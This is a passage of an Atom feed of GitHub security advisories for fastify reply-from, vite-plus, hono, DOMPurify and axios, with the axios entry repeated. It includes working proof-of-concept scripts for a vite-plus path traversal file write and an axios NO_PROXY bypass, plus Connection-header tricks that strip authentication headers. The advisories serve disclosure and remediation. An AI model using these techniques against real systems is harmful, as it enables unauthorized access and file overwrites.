<li><strong>Bypass proxy identification</strong>: Strip headers that identify requests as coming through the proxy, potentially bypassing upstream controls that differentiate between direct and proxied requests</li>
<li><strong>Circumvent access control</strong>: If the proxy adds headers used for routing, authorization, or security decisions (e.g., <code>x-internal-auth</code>, <code>x-proxy-token</code>), attackers can strip them to access unauthorized resources</li>
<li><strong>Remove arbitrary headers</strong>: Any header can be targeted, including <code>Connection: authorization</code> to strip authentication or <code>Connection: x-forwarded-for, x-forwarded-by</code> to remove multiple headers at once</li>
</ol>
<p>This vulnerability affects deployments where the proxy adds security-relevant headers that downstream services rely on for access control decisions. It undermines the security model where proxies act as trusted intermediaries adding authentication or routing signals.</p>
<h3 id="affected-versions">Affected Versions</h3>
<ul>
<li><code>@fastify/reply-from</code> — All versions, both undici (default) and HTTP/1.1 transport handlers</li>
<li><code>@fastify/http-proxy</code> — All versions (delegates to <code>@fastify/reply-from</code>)</li>
<li>Any configuration using <code>rewriteRequestHeaders</code> to add headers that could be security-relevant</li>
<li>No special configuration required to exploit — works with default settings</li>
</ul>
<h3 id="suggested-fix">Suggested Fix</h3>
<p>The Connection header from the client should be processed and consumed before <code>rewriteRequestHeaders</code> is called, not after. Alternatively, the Connection header processing in <code>request.js</code> should maintain a list of headers that existed in the original client request and only strip those, not headers added by <code>rewriteRequestHeaders</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/fastify/fastify-reply-from/security/advisories/GHSA-gwhp-pf74-vj37">https://github.com/fastify/fastify-reply-from/security/advisories/GHSA-gwhp-pf74-vj37</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33805">https://nvd.nist.gov/vuln/detail/CVE-2026-33805</a></li>
<li><a href="https://cna.openjsf.org/security-advisories.html">https://cna.openjsf.org/security-advisories.html</a></li>
<li><a href="https://github.com/advisories/GHSA-gwhp-pf74-vj37">https://github.com/advisories/GHSA-gwhp-pf74-vj37</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gwhp-pf74-vj37</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-04-16T01:02:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vite-plus]  Path traversal in vite-plus/binding downloadPackageManager() writes outside VP_HOME]]></title>
        <id>https://github.com/advisories/GHSA-33r3-4whc-44c2</id>
        <link href="https://github.com/advisories/GHSA-33r3-4whc-44c2"/>
        <updated>2026-04-16T01:02:51.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>downloadPackageManager()</code> in <code>vite-plus/binding</code> accepts an untrusted <code>version</code> string and uses it directly in filesystem paths. A caller can supply <code>../</code> segments to escape the <code>VP_HOME/package_manager/&lt;pm&gt;/</code> cache root and cause Vite+ to delete, replace, and populate directories outside the intended cache location.</p>
<h3 id="details">Details</h3>
<p>The public <code>vite-plus/binding</code> export <code>downloadPackageManager()</code> forwards <code>options.version</code> directly into the Rust package-manager download flow without validating that it is a normal semver version.</p>
<p>That value is used as a path component when building the install location under <code>VP_HOME</code>. After the package is downloaded and extracted, Vite+:</p>
<ol>
<li>computes the final target directory from the raw <code>version</code> string,</li>
<li>removes any pre-existing directory at that target,</li>
<li>renames the extracted package into that location, and</li>
<li>writes executable shim files there.</li>
</ol>
<p>Because the CLI validates versions via <code>semver::Version::parse()</code> before calling this code, the protection that exists for normal <code>vp create</code>, <code>vp migrate</code>, and <code>vp env</code> flows does not apply to direct callers of the binding. A programmatic caller of <code>vite-plus/binding</code> can pass traversal strings such as <code>../../../escaped</code> and break out of <code>VP_HOME</code>.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-js">import fs from "node:fs";
import http from "node:http";
import os from "node:os";
import path from "node:path";
import { downloadPackageManager } from "vite-plus/binding";

const tgz = Buffer.from(
  "H4sIAH/B1GkC/+3NsQqDMBjE8W/uU4hTXUwU0/dJg0irTYLR9zftUnCWQvH/W+645aJ1ox16dX94FX181e6Z5GA6u3XdJ7N9at223/7em8YYI4WWH1jTYud8L+fkgk9h6uspDNcyjGV1EQAAAAAAAAAAAAAAAADAH9gAb+vJ9QAoAAA=",
  "base64",
);

const vpHome = fs.mkdtempSync(path.join(os.tmpdir(), "vp-home-"));
const version = "../../../vite-plus-escape";
const escapedRoot = path.resolve(vpHome, "package_manager", "pnpm", version);
const escapedInstallDir = path.join(escapedRoot, "pnpm");

process.env.VP_HOME = vpHome;

const server = http.createServer((req, res) =&gt; {
  res.writeHead(200, { "content-type": "application/octet-stream" });
  res.end(tgz);
});

await new Promise((resolve) =&gt; server.listen(0, "127.0.0.1", resolve));
const { port } = server.address();
process.env.npm_config_registry = `http://127.0.0.1:${port}`;

const result = await downloadPackageManager({
  name: "pnpm",
  version,
});

server.close();

console.log("VP_HOME =", vpHome);
console.log("installDir =", result.installDir);
console.log("escaped =", escapedInstallDir);
console.log("shim exists =", fs.existsSync(path.join(escapedInstallDir, "bin", "pnpm")));

// installDir is outside VP_HOME, and &lt;escaped&gt;/pnpm/bin/pnpm is created
</code></pre>
<h3 id="impact">Impact</h3>
<p>A caller that can influence <code>downloadPackageManager()</code> input can escape the Vite+ cache directory and make the process overwrite attacker-chosen directories outside <code>VP_HOME</code>. When combined with the supported custom-registry override (<code>npm_config_registry</code>), this becomes attacker-controlled file write outside the intended install root.</p>
<h3 id="mitigating-factors">Mitigating factors</h3>
<ul>
<li><strong>Normal CLI usage is not affected.</strong> All built-in CLI paths (<code>vp create</code>, <code>vp migrate</code>, <code>vp env</code>) validate the version string via <code>semver::Version::parse()</code> before it reaches <code>downloadPackageManager()</code>.</li>
<li>The vulnerability is only reachable by programmatic callers that import <code>vite-plus/binding</code> directly and pass an untrusted version string.</li>
<li>No known downstream consumers pass untrusted input to this function.</li>
<li>Exploitation requires the attacker to already be executing code in the same Node.js process.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/voidzero-dev/vite-plus/security/advisories/GHSA-33r3-4whc-44c2">https://github.com/voidzero-dev/vite-plus/security/advisories/GHSA-33r3-4whc-44c2</a></li>
<li><a href="https://github.com/advisories/GHSA-33r3-4whc-44c2">https://github.com/advisories/GHSA-33r3-4whc-44c2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-33r3-4whc-44c2</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-16T01:02:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[hono] hono Improperly Handles JSX Attribute Names Allows HTML Injection in hono/jsx SSR]]></title>
        <id>https://github.com/advisories/GHSA-458j-xx4x-4375</id>
        <link href="https://github.com/advisories/GHSA-458j-xx4x-4375"/>
        <updated>2026-04-16T01:02:26.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Improper handling of JSX attribute names in hono/jsx allows malformed attribute keys to corrupt the generated HTML output.</p>
<p>When untrusted input is used as attribute keys during server-side rendering, specially crafted keys can break out of attribute or tag boundaries and inject unintended HTML.</p>
<h2 id="details">Details</h2>
<p>When rendering JSX elements to HTML strings, attribute values are escaped, but attribute names (keys) were previously inserted into the output without validation.</p>
<p>If an attribute name contains characters such as <code>"</code>, <code>&gt;</code>, or whitespace, it can alter the structure of the generated HTML.</p>
<p>For example, malformed attribute names can:</p>
<ul>
<li>Break out of the current attribute and introduce unintended additional attributes</li>
<li>Break out of the current HTML tag and inject new elements into the output</li>
</ul>
<p>This issue arises when untrusted input (such as query parameters or form data) is used as JSX attribute keys during server-side rendering.</p>
<h2 id="impact">Impact</h2>
<p>An attacker who can control attribute keys used in JSX rendering may inject unintended attributes or HTML elements into the generated output.</p>
<p>This may lead to:</p>
<ul>
<li>Injection of unexpected HTML attributes</li>
<li>Corruption of the HTML structure</li>
<li>Potential cross-site scripting (XSS) if combined with unsafe usage patterns</li>
</ul>
<p>This issue affects applications that pass untrusted input as JSX attribute keys during server-side rendering.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/honojs/hono/security/advisories/GHSA-458j-xx4x-4375">https://github.com/honojs/hono/security/advisories/GHSA-458j-xx4x-4375</a></li>
<li><a href="https://github.com/advisories/GHSA-458j-xx4x-4375">https://github.com/advisories/GHSA-458j-xx4x-4375</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-458j-xx4x-4375</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-16T01:02:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[dompurify] DOMPurify's ADD_TAGS function form bypasses FORBID_TAGS due to short-circuit evaluation]]></title>
        <id>https://github.com/advisories/GHSA-39q2-94rc-95cp</id>
        <link href="https://github.com/advisories/GHSA-39q2-94rc-95cp"/>
        <updated>2026-04-16T00:46:36.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>In <code>src/purify.ts:1117-1123</code>, <code>ADD_TAGS</code> as a function (via <code>EXTRA_ELEMENT_HANDLING.tagCheck</code>) bypasses <code>FORBID_TAGS</code> due to short-circuit evaluation.</p>
<p>The condition:</p>
<pre><code>!(tagCheck(tagName)) &amp;&amp; (!ALLOWED_TAGS[tagName] || FORBID_TAGS[tagName])
</code></pre>
<p>When <code>tagCheck(tagName)</code> returns <code>true</code>, the entire condition is <code>false</code> and the element is kept — <code>FORBID_TAGS[tagName]</code> is never evaluated.</p>
<h2 id="inconsistency">Inconsistency</h2>
<p>This contradicts the attribute-side pattern at line 1214 where <code>FORBID_ATTR</code> explicitly wins first:</p>
<pre><code>if (FORBID_ATTR[lcName]) { continue; }
</code></pre>
<p>For tags, FORBID should also take precedence over ADD.</p>
<h2 id="impact">Impact</h2>
<p>Applications using both <code>ADD_TAGS</code> as a function and <code>FORBID_TAGS</code> simultaneously get unexpected behavior — forbidden tags are allowed through. Config-dependent but a genuine logic inconsistency.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Check <code>FORBID_TAGS</code> before <code>tagCheck</code>:</p>
<pre><code>if (FORBID_TAGS[tagName]) { /* remove */ }
else if (tagCheck(tagName) || ALLOWED_TAGS[tagName]) { /* keep */ }
</code></pre>
<h2 id="affected-version">Affected Version</h2>
<p>v3.3.3 (commit 883ac15)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cure53/DOMPurify/security/advisories/GHSA-39q2-94rc-95cp">https://github.com/cure53/DOMPurify/security/advisories/GHSA-39q2-94rc-95cp</a></li>
<li><a href="https://github.com/advisories/GHSA-39q2-94rc-95cp">https://github.com/advisories/GHSA-39q2-94rc-95cp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-39q2-94rc-95cp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-16T00:46:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[axios] Axios has a NO_PROXY Hostname Normalization Bypass that Leads to SSRF]]></title>
        <id>https://github.com/advisories/GHSA-3p68-rc4w-qgx5</id>
        <link href="https://github.com/advisories/GHSA-3p68-rc4w-qgx5"/>
        <updated>2026-04-16T18:44:34.000Z</updated>
        <content type="html"><![CDATA[<p>Axios does not correctly handle hostname normalization when checking <code>NO_PROXY</code> rules.
Requests to loopback addresses like <code>localhost.</code> (with a trailing dot) or <code>[::1]</code> (IPv6 literal) skip <code>NO_PROXY</code> matching and go through the configured proxy.</p>
<p>This goes against what developers expect and lets attackers force requests through a proxy, even if <code>NO_PROXY</code> is set up to protect loopback or internal services.</p>
<p>According to <a href="https://datatracker.ietf.org/doc/html/rfc1034#section-3.1">RFC 1034 §3.1</a> and <a href="https://datatracker.ietf.org/doc/html/rfc3986#section-3.2.2">RFC 3986 §3.2.2</a>, a hostname can have a trailing dot to show it is a fully qualified domain name (FQDN). At the DNS level, <code>localhost.</code> is the same as <code>localhost</code>. 
However, Axios does a literal string comparison instead of normalizing hostnames before checking <code>NO_PROXY</code>. This causes requests like <code>http://localhost.:8080/</code> and <code>http://[::1]:8080/</code> to be incorrectly proxied.</p>
<p>This issue leads to the possibility of proxy bypass and SSRF vulnerabilities allowing attackers to reach sensitive loopback or internal services despite the configured protections.</p>
<hr>
<p><strong>PoC</strong></p>
<pre><code class="language-js">import http from "http";
import axios from "axios";

const proxyPort = 5300;

http.createServer((req, res) =&gt; {
  console.log("[PROXY] Got:", req.method, req.url, "Host:", req.headers.host);
  res.writeHead(200, { "Content-Type": "text/plain" });
  res.end("proxied");
}).listen(proxyPort, () =&gt; console.log("Proxy", proxyPort));

process.env.HTTP_PROXY = `http://127.0.0.1:${proxyPort}`;
process.env.NO_PROXY = "localhost,127.0.0.1,::1";

async function test(url) {
  try {
    await axios.get(url, { timeout: 2000 });
  } catch {}
}

setTimeout(async () =&gt; {
  console.log("\n[*] Testing http://localhost.:8080/");
  await test("http://localhost.:8080/"); // goes through proxy

  console.log("\n[*] Testing http://[::1]:8080/");
  await test("http://[::1]:8080/"); // goes through proxy
}, 500);
</code></pre>
<p><strong>Expected:</strong> Requests bypass the proxy (direct to loopback).
<strong>Actual:</strong> Proxy logs requests for <code>localhost.</code> and <code>[::1]</code>.</p>
<hr>
<p><strong>Impact</strong></p>
<ul>
<li><p>Applications that rely on <code>NO_PROXY=localhost,127.0.0.1,::1</code> for protecting loopback/internal access are vulnerable.</p>
</li>
<li><p>Attackers controlling request URLs can:</p>
<ul>
<li>Force Axios to send local traffic through an attacker-controlled proxy.</li>
<li>Bypass SSRF mitigations relying on NO_PROXY rules.</li>
<li>Potentially exfiltrate sensitive responses from internal services via the proxy.</li>
</ul>
</li>
</ul>
<hr>
<p><strong>Affected Versions</strong></p>
<ul>
<li>Confirmed on Axios <strong>1.12.2</strong> (latest at time of testing).</li>
<li>affects all versions that rely on Axios’ current <code>NO_PROXY</code> evaluation.</li>
</ul>
<hr>
<p><strong>Remediation</strong>
Axios should normalize hostnames before evaluating <code>NO_PROXY</code>, including:</p>
<ul>
<li>Strip trailing dots from hostnames (per RFC 3986).</li>
<li>Normalize IPv6 literals by removing brackets for matching.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/axios/axios/security/advisories/GHSA-3p68-rc4w-qgx5">https://github.com/axios/axios/security/advisories/GHSA-3p68-rc4w-qgx5</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-62718">https://nvd.nist.gov/vuln/detail/CVE-2025-62718</a></li>
<li><a href="https://github.com/axios/axios/pull/10661">https://github.com/axios/axios/pull/10661</a></li>
<li><a href="https://github.com/axios/axios/commit/fb3befb6daac6cad26b2e54094d0f2d9e47f24df">https://github.com/axios/axios/commit/fb3befb6daac6cad26b2e54094d0f2d9e47f24df</a></li>
<li><a href="https://datatracker.ietf.org/doc/html/rfc1034#section-3.1">https://datatracker.ietf.org/doc/html/rfc1034#section-3.1</a></li>
<li><a href="https://datatracker.ietf.org/doc/html/rfc3986#section-3.2.2">https://datatracker.ietf.org/doc/html/rfc3986#section-3.2.2</a></li>
<li><a href="https://github.com/axios/axios/releases/tag/v1.15.0">https://github.com/axios/axios/releases/tag/v1.15.0</a></li>
<li><a href="https://github.com/axios/axios/pull/10688">https://github.com/axios/axios/pull/10688</a></li>
<li><a href="https://github.com/axios/axios/commit/03cdfc99e8db32a390e12128208b6778492cee9c">https://github.com/axios/axios/commit/03cdfc99e8db32a390e12128208b6778492cee9c</a></li>
<li><a href="https://github.com/axios/axios/releases/tag/v0.31.0">https://github.com/axios/axios/releases/tag/v0.31.0</a></li>
<li><a href="https://github.com/advisories/GHSA-3p68-rc4w-qgx5">https://github.com/advisories/GHSA-3p68-rc4w-qgx5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3p68-rc4w-qgx5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-09T17:32:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[axios] Axios has a NO_PROXY Hostname Normalization Bypass that Leads to SSRF]]></title>
        <id>https://github.com/advisories/GHSA-3p68-rc4w-qgx5</id>
        <link href="https://github.com/advisories/GHSA-3p68-rc4w-qgx5"/>
        <updated>2026-04-16T18:44:34.000Z</updated>
        <content type="html"><![CDATA[<p>Axios does not correctly handle hostname normalization when checking <code>NO_PROXY</code> rules.
Requests to loopback addresses like <code>localhost.</code> (with a trailing dot) or <code>[::1]</code> (IPv6 literal) skip <code>NO_PROXY</code> matching and go through the configured proxy.</p>
<p>This goes against what developers expect and lets attackers force requests through a proxy, even if <code>NO_PROXY</code> is set up to protect loopback or internal services.</p>
<p>According to <a href="https://datatracker.ietf.org/doc/html/rfc1034#section-3.1">RFC 1034 §3.1</a> and <a href="https://datatracker.ietf.org/doc/html/rfc3986#section-3.2.2">RFC 3986 §3.2.2</a>, a hostname can have a trailing dot to show it is a fully qualified domain name (FQDN). At the DNS level, <code>localhost.</code> is the same as <code>localhost</code>. 
However, Axios does a literal string comparison instead of normalizing hostnames before checking <code>NO_PROXY</code>. This causes requests like <code>http://localhost.:8080/</code> and <code>http://[::1]:8080/</code> to be incorrectly proxied.</p>
<p>This issue leads to the possibility of proxy bypass and SSRF vulnerabilities allowing attackers to reach sensitive loopback or internal services despite the configured protections.</p>
<hr>
<p><strong>PoC</strong></p>
<pre><code class="language-js">import http from "http";
import axios from "axios";

const proxyPort = 5300;

http.createServer((req, res) =&gt; {
  console.log("[PROXY] Got:", req.method, req.url, "Host:", req.headers.host);
  res.writeHead(200, { "Content-Type": "text/plain" });
  res.end("proxied");
}).listen(proxyPort, () =&gt; console.log("Proxy", proxyPort));

process.env.HTTP_PROXY = `http://127.0.0.1:${proxyPort}`;
process.env.NO_PROXY = "localhost,127.0.0.1,::1";

async function test(url) {
  try {
    await axios.get(url, { timeout: 2000 });
  } catch {}
}

setTimeout(async () =&gt; {
  console.log("\n[*] Testing http://localhost.:8080/");
  await test("http://localhost.:8080/"); // goes through proxy

  console.log("\n[*] Testing http://[::1]:8080/");
  await test("http://[::1]:8080/"); // goes through proxy
}, 500);
</code></pre>
<p><strong>Expected:</strong> Requests bypass the proxy (direct to loopback).
<strong>Actual:</strong> Proxy logs requests for <code>localhost.</code> and <code>[::1]</code>.</p>
<hr>
<p><strong>Impact</strong></p>
<ul>
<li><p>Applications that rely on <code>NO_PROXY=localhost,127.0.0.1,::1</code> for protecting loopback/internal access are vulnerable.</p>
</li>
<li><p>Attackers controlling request URLs can:</p>
<ul>
<li>Force Axios to send local traffic through an attacker-controlled proxy.</li>
<li>Bypass SSRF mitigations relying on NO_PROXY rules.</li>
<li>Potentially exfiltrate sensitive responses from internal services via the proxy.</li>
</ul>
</li>
</ul>
<hr>
<p><strong>Affected Versions</strong></p>
<ul>
<li>Confirmed on Axios <strong>1.12.2</strong> (latest at time of testing).</li>
<li>affects all versions that rely on Axios’ current <code>NO_PROXY</code> evaluation.</li>
</ul>
<hr>
<p><strong>Remediation</strong>
Axios should normalize hostnames before evaluating <code>NO_PROXY</code>, including:</p>
<ul>
<li>Strip trailing dots from hostnames (per RFC 3986).</li>
<li>Normalize IPv6 literals by removing brackets for matching.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/axios/axios/security/advisories/GHSA-3p68-rc4w-qgx5">https://github.com/axios/axios/security/advisories/GHSA-3p68-rc4w-qgx5</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-62718">https://nvd.nist.gov/vuln/detail/CVE-2025-62718</a></li>
<li><a href="https://github.com/axios/axios/pull/10661">https://github.com/axios/axios/pull/10661</a></li>
<li><a href="https://github.com/axios/axios/commit/fb3befb6daac6cad26b2e54094d0f2d9e47f24df">https://github.com/axios/axios/commit/fb3befb6daac6cad26b2e54094d0f2d9e47f24df</a></li>
<li><a href="https://datatracker.ietf.org/doc/html/rfc1034#section-3.1">https://datatracker.ietf.org/doc/html/rfc1034#section-3.1</a></li>
<li><a href="https://datatracker.ietf.org/doc/html/rfc3986#section-3.2.2">https://datatracker.ietf.org/doc/html/rfc3986#section-3.2.2</a></li>
<li><a href="https://github.com/axios/axios/releases/tag/v1.15.0">https://github.com/axios/axios/releases/tag/v1.15.0</a></li>
<li><a href="https://github.com/axios/axios/pull/10688">https://github.com/axios/axios/pull/10688</a></li>
<li><a href="https://github.com/axios/axios/commit/03cdfc99e8db32a390e12128208b6778492cee9c">https://github.com/axios/axios/commit/03cdfc99e8db32a390e12128208b6778492cee9c</a></li>
<li><a href="https://github.com/axios/axios/releases/tag/v0.31.0">https://github.com/axios/axios/releases/tag/v0.31.0</a></li>
<li><a href="https://github.com/advisories/GHSA-3p68-rc4w-qgx5">https://github.com/advisories/GHSA-3p68-rc4w-qgx5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3p68-rc4w-qgx5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-09T17:32:19.000Z</published>
    </entry>
</feed>